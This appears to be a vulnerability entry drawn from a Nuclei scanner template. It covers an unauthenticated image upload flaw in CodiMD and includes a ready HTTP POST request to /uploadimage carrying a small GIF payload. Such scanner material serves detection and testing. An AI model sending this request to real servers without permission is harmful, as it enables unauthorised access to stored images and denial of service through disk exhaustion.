# Vulnerability: CodiMD - File Upload
**Classification:** FILE-UPLOAD
**Source:** Nuclei Template (`codimd-file-upload.yaml`)

## Description
CodiMD does not require valid authentication to access uploaded images or to upload new image data. An attacker who can determine an uploaded image's URL can gain unauthorised access to uploaded image data, or can create a denial of service condition by exhausting all available disk space.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /uploadimage HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=---------------------------92633278134516118923780781161

-----------------------------92633278134516118923780781161
Content-Disposition: form-data; name="image"; filename="{{randstr}}.gif"
Content-Type: image/gif

{{base64_decode("R0lGODlhAQABAIABAP///wAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==")}}
-----------------------------92633278134516118923780781161--
```

